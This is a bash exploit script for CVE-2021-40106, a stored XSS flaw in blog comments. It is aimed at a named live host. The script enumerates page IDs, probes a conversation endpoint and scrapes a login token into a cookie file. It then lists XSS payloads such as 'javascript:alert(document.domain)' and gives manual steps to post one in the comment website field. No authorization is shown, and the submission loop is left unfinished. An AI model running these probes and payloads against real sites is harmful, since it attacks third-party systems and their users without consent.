#!/bin/bash
# CVE-2021-40106: Unauthenticated Stored XSS in Blog Comments (Website Field)
# Severity: Medium
# Affected: < 8.5.6

echo "=== CVE-2021-40106: Testing Unauthenticated XSS in Blog Comments ==="

# Step 1: Find blog pages with comments enabled
echo -e "\n[1] Finding blog pages..."
for i in $(seq 1 200); do
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "https://jobs.dnv.com/index.php?cID=$i%00")
    if [ "$RESPONSE" == "200" ]; then
        echo "Page cID=$i exists (200)"
        # Check if it has blog/comment functionality
        curl -s "https://jobs.dnv.com/index.php?cID=$i%00" | grep -i -E "(blog|comment|conversation)" && echo "  -> Has blog/comment keywords!"
    fi
done

# Step 2: Check for blog/conversation endpoints
echo -e "\n[2] Checking blog/conversation endpoints..."
curl -s "https://jobs.dnv.com/index.php/ccm/system/dialogs/conversation/add_message%00" -v

# Step 3: Look for existing blog posts
echo -e "\n[3] Searching for blog blocks..."
curl -s "https://jobs.dnv.com/%00" | grep -i "blog"

# Step 4: Attempt XSS payload in website field
echo -e "\n[4] Testing XSS payload in blog comment..."
TOKEN=$(curl -c /tmp/cookies_blog.txt -s "https://jobs.dnv.com/index.php/login%00" | grep -oP 'name="ccm_token" value="\K[^"]+')

# XSS payloads for website field
PAYLOADS=(
    'javascript:alert(document.domain)'
    'http://"><script>alert(1)</script>'
    'http://xss.test"onload="alert(document.domain)'
)

for payload in "${PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    # This would need to be adjusted based on actual blog comment form parameters
    # Typical parameters: cnvMessageBody, cnvMessageAuthorName, cnvMessageAuthorWebsite, ccm_token
done

echo -e "\n[*] Manual test required: Find a blog post with comments enabled and submit:"
echo "    Name: Test User"
echo "    Website: javascript:alert(document.domain)"
echo "    Comment: Test comment"
echo "    Then view the blog post - if XSS executes, vulnerability confirmed!"
